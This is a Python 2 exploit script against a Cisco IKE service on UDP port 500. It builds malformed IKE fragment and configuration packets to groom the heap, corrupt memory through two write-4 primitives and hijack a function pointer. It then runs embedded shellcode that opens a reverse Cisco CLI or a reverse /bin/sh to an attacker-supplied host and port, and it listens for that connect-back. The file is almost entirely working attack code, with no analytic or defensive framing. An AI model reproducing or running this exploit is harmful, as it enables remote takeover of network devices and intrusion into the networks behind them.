#!/usr/bin/env python2.7

import socket
import sys
import struct
import string
import random
import time



# Spawns a reverse cisco CLI
cliShellcode = (
    "\x60\xc7\x02\x90\x67\xb9\x09\x8b\x45\xf8\x8b\x40\x5c\x8b\x40\x04"
    "\x8b\x40\x08\x8b\x40\x04\x8b\x00\x85\xc0\x74\x3b\x50\x8b\x40\x08"
    "\x8b\x40\x04\x8d\x98\xd8\x00\x00\x00\x58\x81\x3b\xd0\xd4\x00\xe1"
    "\x75\xe4\x83\x7b\x04\x31\x74\xde\x89\xd8\x2d\x00\x01\x00\x00\xc7"
    "\x40\x04\x03\x01\x00\x00\xc7\x40\x0c\xd0\x00\x00\x00\xc7\x80\xf8"
    "\x00\x00\x00\xef\xcd\x1c\xa1\x55\x31\xed\x31\xff\x4f\xbe\x22\x00"
    "\x00\x00\xba\x07\x00\x00\x00\xb9\x00\x10\x00\x00\x31\xdb\xb8\xc0"
    "\x00\x00\x00\xcd\x80\x5d\x89\xc7\xeb\x26\x5e\xb9\x00\x04\x00\x00"
    "\xf3\xa5\x31\xdb\x6a\x03\x68\x00\x20\x00\x00\x53\x50\x68\xfd\xa8"
    "\xff\x09\xb8\xf0\xb7\x06\x08\xff\xd0\x83\xc4\x14\x61\x31\xc0\xc3"
    "\xe8\xd5\xff\xff\xff\x55\x89\xe5\x81\xec\x10\x04\x00\x00\xe9\xb1"
    "\x00\x00\x00\x58\x89\x85\xfc\xfb\xff\xff\x50\xb8\xf0\x07\x07\x08"
    "\xff\xd0\x83\xc4\x04\x89\x85\xf8\xfb\xff\xff\x89\xc3\x8b\x43\x04"
    "\x68\x80\xee\x36\x00\x68\x1a\x90\x01\x00\x53\xff\x50\x70\xc7\x44"
    "\x24\x04\x20\x90\x01\x00\x8b\x43\x04\xff\x50\x70\xc7\x85\xf4\xfb"
    "\xff\xff\x00\x40\x00\x00\x8d\x8d\xf4\xfb\xff\xff\x89\x4c\x24\x08"
    "\xc7\x44\x24\x04\x21\x90\x01\x00\x89\x1c\x24\x8b\x43\x04\xff\x50"
    "\x70\xbe\xc8\xef\xff\xff\x65\x8b\x06\x89\x98\x98\x00\x00\x00\xeb"
    "\x3a\xb8\x80\x0a\x0f\x08\xff\xd0\x5b\xc7\x43\x0c\xff\xff\xff\x17"
    "\x83\xc3\x14\xc7\x03\x65\x6e\x61\x62\xc7\x43\x04\x6c\x65\x5f\x31"
    "\xc7\x43\x08\x35\x00\x00\x00\x6a\x04\x68\x60\xc1\x52\x0a\xb8\x20"
    "\x68\x0f\x08\xff\xd0\x89\xec\x5d\x31\xc0\xc3\xe8\xc1\xff\xff\xff"
    "\x60\xc1\x52\x0a\xe8\x4a\xff\xff\xfftcp/CONNECT/3/@IP@/@PORT@\x00"
    )

# Spawns a reverse "/bin/sh"
shShellcode = (
    "\x60\xc7\x02\x90\x67\xb9\x09\x8b\x45\xf8\x8b\x40\x5c\x8b\x40\x04"
    "\x8b\x40\x08\x8b\x40\x04\x8b\x00\x85\xc0\x74\x3b\x50\x8b\x40\x08"
    "\x8b\x40\x04\x8d\x98\xd8\x00\x00\x00\x58\x81\x3b\xd0\xd4\x00\xe1"
    "\x75\xe4\x83\x7b\x04\x31\x74\xde\x89\xd8\x2d\x00\x01\x00\x00\xc7"
    "\x40\x04\x03\x01\x00\x00\xc7\x40\x0c\xd0\x00\x00\x00\xc7\x80\xf8"
    "\x00\x00\x00\xef\xcd\x1c\xa1\xb8\x40\xbc\x2a\x09\xff\xd0\x61\xb8"
    "\x02\x00\x00\x00\xcd\x80\x85\xc0\x0f\x85\xa1\x01\x00\x00\xba\xed"
    "\x01\x00\x00\xb9\xc2\x00\x00\x00\x68\x2f\x73\x68\x00\x68\x2f\x74"
    "\x6d\x70\x8d\x1c\x24\xb8\x05\x00\x00\x00\xcd\x80\x50\xeb\x31\x59"
    "\x8b\x11\x8d\x49\x04\x89\xc3\xb8\x04\x00\x00\x00\xcd\x80\x5b\xb8"
    "\x06\x00\x00\x00\xcd\x80\x8d\x1c\x24\x31\xd2\x52\x53\x8d\x0c\x24"
    "\xb8\x0b\x00\x00\x00\xcd\x80\x31\xdb\xb8\x01\x00\x00\x00\xcd\x80"
    "\xe8\xca\xff\xff\xff\x46\x01\x00\x00\x7f\x45\x4c\x46\x01\x01\x01"
    "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x03\x00\x01\x00\x00"
    "\x00\x54\x80\x04\x08\x34\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    "\x00\x34\x00\x20\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00"
    "\x00\x00\x00\x00\x00\x00\x80\x04\x08\x00\x80\x04\x08\xf2\x00\x00"
    "\x00\xf2\x00\x00\x00\x07\x00\x00\x00\x00\x10\x00\x00\x55\x89\xe5"
    "\x83\xec\x10\x6a\x00\x6a\x01\x6a\x02\x8d\x0c\x24\xbb\x01\x00\x00"
    "\x00\xb8\x66\x00\x00\x00\xcd\x80\x83\xc4\x0c\x89\x45\xfc\x68\x7f"
    "\x00\x00\x01\x68\x02\x00\x04\x38\x8d\x14\x24\x6a\x10\x52\x50\x8d"
    "\x0c\x24\xbb\x03\x00\x00\x00\xb8\x66\x00\x00\x00\xcd\x80\x83\xc4"
    "\x14\x85\xc0\x7d\x18\x6a\x00\x6a\x01\x8d\x1c\x24\x31\xc9\xb8\xa2"
    "\x00\x00\x00\xcd\x80\x83\xc4\x08\xeb\xc4\x8b\x45\xfc\x83\xec\x20"
    "\x8d\x0c\x24\xba\x03\x00\x00\x00\x8b\x5d\xfc\xc7\x01\x05\x01\x00"
    "\x00\xb8\x04\x00\x00\x00\xcd\x80\xba\x04\x00\x00\x00\xb8\x03\x00"
    "\x00\x00\xcd\x80\xc7\x01\x05\x01\x00\x01\xc7\x41\x04\x0a\x64\x00"
    "\x01\x66\xc7\x41\x08\x11\x5c\xba\x0a\x00\x00\x00\xb8\x04\x00\x00"
    "\x00\xcd\x80\xba\x20\x00\x00\x00\xb8\x03\x00\x00\x00\xcd\x80\x83"
    "\xc4\x20\x8b\x5d\xfc\xb9\x02\x00\x00\x00\xb8\x3f\x00\x00\x00\xcd"
    "\x80\x49\x7d\xf6\x31\xd2\x68\x2d\x69\x00\x00\x89\xe7\x68\x2f\x73"
    "\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\x57\x53\x8d\x0c\x24\xb8"
    "\x0b\x00\x00\x00\xcd\x80\x31\xdb\xb8\x01\x00\x00\x00\xcd\x80\x31"
    "\xc0\xc3"
        )


# SA Session
class Session(object):
    def __init__(self, host_port, id = None):
        if id == None:
            id = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))

        self._host, self._port = host_port
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self._id = id
        self._mid = 1

        
        # Init session
        print("[+] Using session ID: " + self._id)
        self.send(self.make_SA())

        # Check if we got something
        res = self.recv()
        cookie = res[8:16]
        print("[+] Cookie: " + cookie)

        self._cookie = cookie

        # Enforce value of 0x21
        if ord(res[16]) != 0x21:
            raise Exception("Invalid router response")

        print("[+] New SA successfuly created.")


    # UPD socket helpers
    def send(self, buf):
        self._sock.sendto(buf, (self._host, self._port))

    def recv(self, size = 4096):
        data, addr = self._sock.recvfrom(size)
        return data

    def make_SA(self):
        buf = ""
        buf += self._id                  # Initiator SPI 
        buf += "\x00"*8                  # Responder SPI
        buf += "\x21"                    # next payload (security association)
        buf += "\x20"                    # version
        buf += "\x22"                    # exchange type
        buf += "\x08"                    # flags
        buf += "\x00"*4                  # message ID
        buf += "$$$$"                    # length

        # stolen from pcap
        # THIS IS SECURITY ASSOCIATION
        buf += "\x22\x00\x00\x6c\x00\x00\x00\x68\x01\x01\x00\x0b\x03\x00\x00\x0c\x01\x00\x00\x0c\x80\x0e\x01\x00\x03\x00\x00\x0c\x01\x00\x00\x0c\x80\x0e\x00\x80\x03\x00\x00\x08\x01\x00\x00\x03\x03\x00\x00\x08\x01\x00\x00\x02\x03\x00\x00\x08\x02\x00\x00\x02\x03\x00\x00\x08\x02\x00\x00\x01\x03\x00\x00\x08\x03\x00\x00\x02\x03\x00\x00\x08\x03\x00\x00\x01\x03\x00\x00\x08\x04\x00\x00\x02\x03\x00\x00\x08\x04\x00\x00\x05\x00\x00\x00\x08\x04\x00\x00\x0e"

        # THIS IS KEY EXCHANGE
        # this is the type of the next payload...
        buf += "\x28" # 0x28 = Nonce, 0x2b = vendor ID
        # KEY EXCHANGE DATA
        buf += "\x00\x00\x88\x00\x02\x00\x00\x50\xea\xf4\x54\x1c\x61\x24\x1b\x59\x3f\x48\xcb\x12\x8c\xf1\x7f\x5f\xd4\xd8\xe9\xe2\xfd\x3c\x66\x70\xef\x08\xf6\x56\xcd\x83\x16\x65\xc1\xdf\x1c\x2b\xb1\xc4\x92\xca\xcb\xd2\x68\x83\x8e\x2f\x12\x94\x12\x48\xec\x78\x4b\x5d\xf3\x57\x87\x36\x1b\xba\x5b\x34\x6e\xec\x7e\x39\xc1\xc2\x2d\xf9\x77\xcc\x19\x39\x25\x64\xeb\xb7\x85\x5b\x16\xfc\x2c\x58\x56\x11\xfe\x49\x71\x32\xe9\xe8\x2d\x27\xbe\x78\x71\x97\x7a\x74\x42\x30\x56\x62\xa2\x99\x9c\x56\x0f\xfe\xd0\xa2\xe6\x8f\x72\x5f\xc3\x87\x4c\x7c\x9b\xa9\x80\xf1\x97\x57\x92"
            
        # this is the Nonce payload
        buf += "\x2b"
        buf += "\x00\x00\x18\x97\x40\x6a\x31\x04\x4d\x3f\x7d\xea\x84\x80\xe9\xc8\x41\x5f\x84\x49\xd3\x8c\xee"
        # lets try a vendor id or three
        buf += "\x2b" # next payload, more vendor ID
        buf += "\x00" # critical bit
        vid = "CISCO-DELETE-REASON"
        buf += struct.pack(">H", len(vid)+4)
        buf += vid

        # another vendor id
        buf += "\x2b"	# next payload, more vendor ID
        buf += "\x00"	# critical bit
        vid = "CISCO(COPYRIGHT)&Copyright (c) 2009 Cisco Systems, Inc."
        buf += struct.pack(">H", len(vid)+4)
        buf += vid

        # another vendor id
        buf += "\x2b"	# next payload, more vid
        buf += "\x00"	# crit
        vid = "CISCO-GRE-MODE"
        buf += struct.pack(">H", len(vid)+4)
        buf += vid

        # last vendor id
        buf += "\x00"	# next payload
        buf += "\x00"
        vid = "\x40\x48\xb7\xd5\x6e\xbc\xe8\x85\x25\xe7\xde\x7f\x00\xd6\xc2\xd3"
        buf += struct.pack(">H", len(vid)+4)
        buf += vid
            
        return buf.replace("$$$$", struct.pack(">L", len(buf)))

    def make_cisco_fragment(self, flength, seqno, fragid, lastfrag, sploit):
        buf = ''
        buf += self._id               # Initiator SPI (random)
        buf += self._cookie                # Responder SPI
        buf += "\x84"                   # next payload
        buf += "\x20"                   # version
        buf += "\x25"                   # exchange type (2=identify protection)
        buf += "\x08"                   # flags
        buf += "\x00\x00\x00\x01"       # message ID
        buf += "ABCD"                   # length

        # PAYLOAD
        payload = ""
        payload += "\x00"               # next payload (none)
        payload += "\x00"               # critical bit
        payload += struct.pack(">H", flength) 		#payload_len)  # length
        payload += struct.pack(">H", fragid)        # frag ID
        payload += struct.pack("B", seqno)         # frag sequence
        payload += struct.pack("B", lastfrag)
        payload += sploit

        buf += payload
        return buf.replace("ABCD", struct.pack(">L", len(buf)))


    def send_fragment(self, flength, seqno, fragid, lastfrag, sploit):
        buf = self.make_cisco_fragment(flength, seqno, fragid, lastfrag, sploit)
        self.send(buf)

        # We're not supposed to receive anything if everything went
        # according to plan

    def make_cisco_option_list(self, opt_lst):
        buf = ''
        buf += self._id               # Initiator SPI (random)
        buf += self._cookie                # Responder SPI
        buf += "\x2f"                   # next payload
        buf += "\x20"                   # version
        buf += "\x25"                   # exchange type (2=identify protection)
        buf += "\x08"                   # flags
        buf += struct.pack(">I", 1)       # message ID
        buf += "ABCD"                   # length

        # PAYLOAD
        payload = ""
        payload += "\x00"               # next payload (none)
        payload += "\x00"               # critical bit
        payload += "EF" 		#payload_len)  # length
        payload += "\x03"               # CFG_SET
        payload += "\x00\x00\x00"       # Reserved

        total = 0x8
        for size, n in opt_lst:
            option  = struct.pack(">H", 0x6000)  #id
            option += struct.pack(">H", size)    # data length
            option += "A" * (size)

            total += (size + 4) * n
            payload += option * n
        buf += payload


        packet = buf.replace("ABCD", struct.pack(">L", len(buf))).replace("EF", struct.pack(">H", total))

        return packet


class Exploit(object):
    def __init__(self, host, revHost, revPort = 4444):
        self._host = host
        self._port = 500
        self._revHost = revHost
        self._revPort = revPort
        self._sessions = []


    # Create a new SA session
    def create_SA(self, id = None):

        # Create a new socket for session
        sess = Session((self._host, self._port), id)

        # Append to session list
        self._sessions.append(sess)

        return sess


    # Interact with reverse shell
    def interact(self):
        from telnetlib import Telnet

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        s.bind((self._revHost, self._revPort))
        s.listen(5)
        cli = s.accept()[0]
        s.close()
        print("[+] Got connect-back")

        t = Telnet()
        t.sock = cli
        t.interact()

    def buildPayload(self, cli = False):
        if cli == False:
            buf = bytearray(shShellcode)
            # Adjust IP and port
            buf[0x1ad:0x1b1] = socket.inet_aton(self._revHost)
            buf[0x1b5:0x1b7] = struct.pack(">H", self._revPort)
            Shellcode = bytes(buf)
        else:
            Shellcode = cliShellcode.replace("@IP@", self._revHost).replace("@PORT@", str(self._revPort))

        return Shellcode


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("[+] Usage: {0:s} <cisco IP> <attacker IP>[:port]".format(sys.argv[0]))
        sys.exit(0)

    #TODO: Check host
    host = sys.argv[1]
    revHost = sys.argv[2]

    # Parse revHost
    port = 4444
    if revHost.rfind(":") != -1:
        revHost, port = revHost.split(":")
        port = int(port)

    exploit = Exploit(host, revHost, port)
    sess1 = exploit.create_SA()
    sess2 = exploit.create_SA()

    n = 0xd6
    sess2.send_fragment(0x8 + n + 3, 1, 5, 0, "A" * (n + 3))

    # Send packets which will trigger the vulnerability
    # Weird packet to get a size of 0x1
    sess2.send_fragment(8 + -7, 0, 6, 1, "A" * (256 - 7))

    # This fragment will be the one being copied
    # during the memory corruption
    buf = "A" * (n - 0xd + 0x3)
    buf += struct.pack("<I", 0xef000000)
    buf += struct.pack("<I", 0x00a11ccd) # chunk magics
    buf += struct.pack("<I", 0xe100d4d0)
    buf += struct.pack("B", 0x61)       # set size from 0x31 to 0x61 in order to encompass the
                                        # adjacent chunk on free
    sess2.send_fragment(8 + n + 3, 1, 6, 0, buf)


    sess1.send_fragment(0x8 + 0xf8, 1, 0xeb, 0, "A" * 0xf8)
    pkt = sess1.make_cisco_option_list((
        (0xd0, 0x30), 
        )
    )

    # Defragment heap
    sess1.send(pkt)
    sess1.send(pkt)
    sess1.send(pkt)

    # Prepare a fake chunk
    buf  = ""
    buf += struct.pack("<I", 0x60)
    buf += struct.pack("<I", 0x102)
    buf += struct.pack("<I", 0xa11c0123)
    buf += struct.pack("<I", 0xe0)
    buf += "A" * 0xe8

    # And allocate it right after a 0x100 bytes hole
    sess1.send_fragment(0x8 + 0xf8, 2, 0xeb, 0, buf)

    # Trigger the overflow
    sess2.send_fragment(8 + -7, 3, 6, 1, "A" * (256 - 7))

    # Retrieve of fake freed block
    #buf = "\xcc" * (0xd0 - len(buf))
    buf = "\x00" * 0xd0


    buf += struct.pack("<I", 0xe100d4d0)
    buf += struct.pack("<I", 0x31)

    # this is a special writable address in the process
    # it translate into the following executable code:
    # nop / jmp [ecx]
    # since ecx happens to hold a pointer to a controlled buffer
    # the execution flow will be redirected to attacker controlled data
    what = 0xc821ff90

    # Just some writable address in the process which doesn't seem to be used
    where = 0xc8002000 - 0x8

    buf += struct.pack("<I", what)
    buf += struct.pack("<I", where)
    buf += struct.pack("<I", 0xf3ee0123)
    buf += struct.pack("<I", 0x0) * 5
    buf += struct.pack("<I", 0x5ee33210)
    buf += struct.pack("<I", 0xf3eecdef)
    buf += struct.pack("<I", 0x30)
    buf += struct.pack("<I", 0x132)
    buf += struct.pack("<I", 0xa11c0123)
    buf += struct.pack("<I", 0x100)
    buf += struct.pack("<I", 0x0) * 2

    # Second write-4 pointers
    # This is the address of the pointer to the "list_add" function
    # which will give us control of execution flow
    where = 0x0A99B7A4 - 0x10

    # This is the address where the opcode sequence "nop / jmp [ecx]" is located
    what = 0xc8002000

    buf += struct.pack("<I", what)
    buf += struct.pack("<I", where)

    buf += "\x00" * (0x128 - len(buf))
    
    # Try to chain a config list and a fragment packet
    packet = bytearray()
    packet += sess1._id               # Initiator SPI (random)
    packet += sess1._cookie                # Responder SPI
    packet += "\x2f"                   # next payload option list
    packet += "\x20"                   # version
    packet += "\x25"                   # exchange type (2=identify protection)
    packet += "\x08"                   # flags
    packet += struct.pack(">I", 1)       # message ID
    packet += "XXXX"                   # total length including header

    payload = bytearray()
    payload += "\x00"               # next payload (frag)
    payload += "\x00"               # critical bit
    payload += "\x00\x00" 	    # payload length
    payload += "\x03"               # CFG_SET
    payload += "\x00\x00\x00"       # Reserved

    size = 0x130
    option  = struct.pack(">H", 0x8400)  #id
    option += struct.pack(">H", size)    # data length
    option += "\x90" * 0x8 + buf

    payload += option * 0x10


    # Update payload length
    payload[2:4] = struct.pack(">H", len(payload))

    packet += payload

    # Update payload length
    packet[0x18:0x1C] = struct.pack(">I", len(packet))


    packet = bytes(packet)

    # Reallocate the fake freed 0x130 bytes chunk with controlled data
    # this way we can perform a write-4 memory corruption when freeing 
    # the subsequent memory
    sess1.send(packet)

    time.sleep(0.2)
    #raw_input()
    packet = bytearray()
    packet += sess1._id               # Initiator SPI (random)
    packet += sess1._cookie                # Responder SPI
    packet += "\x84"                   # next payload option list
    packet += "\x20"                   # version
    packet += "\x25"                   # exchange type (2=identify protection)
    packet += "\x08"                   # flags
    packet += struct.pack(">I", 1)       # message ID
    packet += "XXXX"                   # total length including header

    buf = exploit.buildPayload(cli = True) 
   
    flength = len(buf) + 0x8
    fragid = 0xeb
    seqno = 0x5
    lastfrag = 0
    payload = bytearray() 
    # Jump over garbage directly into shellcode (interpreted as jmp +0x6)
    payload += "\xeb"               # next payload (none)
    payload += "\x06"               # critical bit
    payload += struct.pack(">H", flength) 		#payload_len)  # length
    payload += struct.pack(">H", fragid)        # frag ID
    payload += struct.pack("B", seqno)         # frag sequence
    payload += struct.pack("B", lastfrag)
    payload += buf

    packet += payload

    # Update payload length
    packet[0x18:0x1C] = struct.pack(">I", len(packet))


    packet = bytes(packet)

    # Trigger the 2 write-4 and get code execution
    sess1.send(packet)

    # Hopefully we'll get something interesting
    exploit.interact()